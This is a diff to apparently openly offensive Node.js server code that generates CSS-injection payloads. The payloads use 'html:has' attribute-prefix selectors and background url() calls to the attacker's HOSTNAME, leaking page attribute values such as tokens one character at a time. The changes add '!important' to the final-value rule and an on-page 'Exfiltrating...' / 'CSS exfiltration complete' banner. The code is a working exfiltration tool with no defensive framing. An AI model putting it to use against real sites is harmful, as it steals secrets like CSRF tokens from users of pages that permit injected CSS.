@@ -137,6 +137,7 @@ const genResponse = (request, response, elementNumber) => {
         response.end();
         return;
     }
+
     const n = session.get(ip).get('n');
     const prefixes = session.get(ip).get('prefixes');
     const tokens = session.get(ip).get('tokens');
@@ -151,7 +152,7 @@ const genResponse = (request, response, elementNumber) => {
             }
             const prefix = prefixes.get(prefixKey);
             css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"]'+generateNotSelectors(tokens, element, attribute)+')' + '{'+variablePrefix+'s:url(' + HOSTNAME + '/l?e='+(elementNumber)+'&n='+n+'&p_'+element[0]+attribute[0]+elementNumber+'=' + encodeURIComponent(prefix + e) +');}')).join('');
-            css += 'html:has('+element+'['+attribute+'="'+ escapeCSS(prefix) + '"]){'+variablePrefix+'f:url(' + HOSTNAME + '/c?t='+element+'&a='+attribute+'&e='+elementNumber+'&v=' + encodeURIComponent(prefix) + ');}';
+            css += 'html:has('+element+'['+attribute+'="'+ escapeCSS(prefix) + '"]){'+variablePrefix+'f:url(' + HOSTNAME + '/c?t='+element+'&a='+attribute+'&e='+elementNumber+'&v=' + encodeURIComponent(prefix) + ')!important;}';
         }
     }
     if(n === 0 && elementNumber === 0) {  
@@ -167,6 +168,9 @@ const genResponse = (request, response, elementNumber) => {
             }
         }
         css += `html{background:${properties.join(',')};}`;
+    }
+    if(SHOW_RESULTS_IN_BROWSER) {
+        css += htmlBeforeCSS('Exfiltrating...', false);
     }
     response.writeHead(200, { 'Content-Type': 'text/css'});
     response.write(css);
@@ -213,6 +217,26 @@ function destroySession(request) {
     session.delete(ip);
 }
 
+function htmlBeforeCSS(text, important) {
+    return `html:before {
+        position:fixed;
+        color: #155724;
+        background-color: #d4edda;
+        border-bottom: 5px solid #c3e6cb;
+        padding: 0.75rem 1.25rem;
+        font-size: 40px;
+        padding: 5px;
+        height:100px;
+        width:100%;
+        content: "${text}"${important?"!important":""};
+        font-family:Arial;
+        box-sizing: border-box;
+        z-index: 2147483647;
+        display: flex;
+        align-items: center;
+    }`;
+}
+
 function completed(request, response) {
     const ip = getIP(request);
     const tokens = session.get(ip).get('tokens',true);
@@ -231,23 +255,7 @@ function completed(request, response) {
     }
     response.writeHead(200, { 'Content-Type': 'text/css'});
     response.write(`
-        html:before {
-            position:fixed;
-            color: #155724;
-            background-color: #d4edda;
-            border-bottom: 5px solid #c3e6cb;
-            padding: 0.75rem 1.25rem;
-            font-size: 40px;
-            padding: 5px;
-            height:100px;
-            width:100%;
-            content: "CSS exfiltration complete";
-            font-family:Arial;
-            box-sizing: border-box;
-            z-index: 2147483647;
-            display: flex;
-            align-items: center;
-        }
+        ${htmlBeforeCSS("CSS exfiltration complete", true)}
         html:after{
             color: #155724;
                 background-color: #d4edda;
